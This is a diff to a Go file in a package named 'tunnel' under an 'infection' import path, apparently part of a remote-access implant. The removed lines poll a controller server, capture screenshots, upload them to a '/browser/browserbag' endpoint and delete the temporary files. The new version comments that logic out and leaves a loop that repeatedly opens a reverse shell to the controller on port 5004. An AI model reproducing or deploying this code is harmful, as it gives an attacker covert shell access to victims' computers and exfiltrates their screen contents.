@@ -1,11 +1,7 @@
 package tunnel
 
 import (
-	"encoding/json"
-	"github.com/parnurzeal/gorequest"
 	"infection/tunnel/reverse"
-	"infection/util/lib"
-	"time"
 	"unsafe"
 )
 
@@ -49,29 +45,29 @@ type Check struct {
 }
 
 func Tunnel(addr string) {
-	var check Check
+	//var check Check
 	for {
-		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(30, 250)))
-		resp, body, _ := gorequest.New().
-			Get("http://" + addr + ":5002/browser/tunnel").
-			End()
-		if resp.StatusCode == 200 && body != "" {
-			if err := json.Unmarshal([]byte(body), &check); err == nil {
-				// if not need  dont open the tunnel to revert shell
-				outip := lib.GetOutIp()
-				if check.Hostid == lib.HOSTID || check.Hostid == outip {
-					filenames := lib.Getscreenshot()
-					finflag := make(chan string)
-					for _, fname := range filenames {
-						go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
-						<-finflag
-						go lib.Removetempimages(filenames, finflag)
-					}
-					reverse.CreateRevShell("tcp", addr+":5004")
-				}
-			}
-		}
-		<-ticker.C
+		//ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(30, 250)))
+		//resp, body, _ := gorequest.New().
+		//	Get("http://" + addr + ":5002/browser/tunnel").
+		//	End()
+		//if resp.StatusCode == 200 && body != "" {
+		//	if err := json.Unmarshal([]byte(body), &check); err == nil {
+		// if not need  dont open the tunnel to revert shell
+		//outip := lib.GetOutIp()
+		//if check.Hostid == lib.HOSTID || check.Hostid == outip {
+		//	filenames := lib.Getscreenshot()
+		//	finflag := make(chan string)
+		//	for _, fname := range filenames {
+		//		go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
+		//		<-finflag
+		//		go lib.Removetempimages(filenames, finflag)
+		//	}
+		reverse.CreateRevShell("tcp", addr+":5004")
+		//}
+		//}
+		//}
+		//<-ticker.C
 	}
 
 }
